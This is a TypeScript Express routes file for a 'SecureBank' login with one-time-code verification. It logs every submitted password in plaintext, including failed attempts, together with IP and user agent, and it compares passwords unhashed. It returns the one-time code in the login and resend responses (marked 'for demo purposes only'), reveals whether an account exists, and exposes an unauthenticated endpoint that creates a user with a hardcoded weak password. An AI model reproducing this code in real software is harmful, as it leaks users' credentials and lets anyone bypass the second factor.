import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginSchema, otpSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Login endpoint
  app.post("/api/auth/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
      const userAgent = req.get('User-Agent') || 'unknown';
      
      // Check if user exists with this email
      const user = await storage.getUserByEmail(validatedData.email);
      
      let success = false;
      let responseData: any;
      
      if (!user) {
        // Log failed login attempt immediately
        await storage.logLoginAttempt(validatedData.email, validatedData.password, false, ipAddress, userAgent);
        
        responseData = {
          success: false, 
          message: "Invalid email or password"
        };
      } else if (user.password !== validatedData.password) {
        // Log failed login attempt immediately
        await storage.logLoginAttempt(validatedData.email, validatedData.password, false, ipAddress, userAgent);
        
        responseData = {
          success: false, 
          message: "Invalid email or password"
        };
      } else {
        // Log successful login attempt immediately
        await storage.logLoginAttempt(validatedData.email, validatedData.password, true, ipAddress, userAgent);
        
        // Generate and store OTP
        const otpCode = await storage.generateOTP(validatedData.email);
        
        success = true;
        responseData = {
          success: true, 
          message: "OTP sent to your email",
          email: validatedData.email,
          // In production, don't send the OTP in response
          otp: otpCode.code // For demo purposes only
        };
      }
      
      if (success) {
        res.json(responseData);
      } else {
        res.status(401).json(responseData);
      }
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ 
          success: false, 
          message: error.errors[0].message 
        });
      }
      res.status(500).json({ 
        success: false, 
        message: "Internal server error" 
      });
    }
  });

  // Verify OTP endpoint
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const validatedData = otpSchema.parse(req.body);
      const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
      const userAgent = req.get('User-Agent') || 'unknown';
      
      const isValid = await storage.verifyOTP(validatedData.email, validatedData.code);
      
      // Log OTP attempt immediately
      await storage.logOTPAttempt(validatedData.email, validatedData.code, isValid, ipAddress, userAgent);
      
      if (!isValid) {
        return res.status(401).json({ 
          success: false, 
          message: "Invalid or expired OTP code" 
        });
      }

      res.json({ 
        success: true, 
        message: "Login successful",
        redirectUrl: "/dashboard"
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ 
          success: false, 
          message: error.errors[0].message 
        });
      }
      res.status(500).json({ 
        success: false, 
        message: "Internal server error" 
      });
    }
  });

  // Resend OTP endpoint
  app.post("/api/auth/resend-otp", async (req, res) => {
    try {
      const { email } = req.body;
      
      if (!email) {
        return res.status(400).json({ 
          success: false, 
          message: "Email is required" 
        });
      }

      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(404).json({ 
          success: false, 
          message: "User not found" 
        });
      }

      const otpCode = await storage.generateOTP(email);
      
      res.json({ 
        success: true, 
        message: "New OTP sent to your email",
        // In production, don't send the OTP in response
        otp: otpCode.code // For demo purposes only
      });
    } catch (error) {
      res.status(500).json({ 
        success: false, 
        message: "Internal server error" 
      });
    }
  });

  // Create demo user endpoint (for testing)
  app.post("/api/auth/create-demo-user", async (req, res) => {
    try {
      const demoUser = await storage.createUser({
        email: "demo@securebank.com",
        password: "password123"
      });
      
      res.json({ 
        success: true, 
        message: "Demo user created",
        user: { id: demoUser.id, email: demoUser.email }
      });
    } catch (error) {
      res.status(500).json({ 
        success: false, 
        message: "Internal server error" 
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
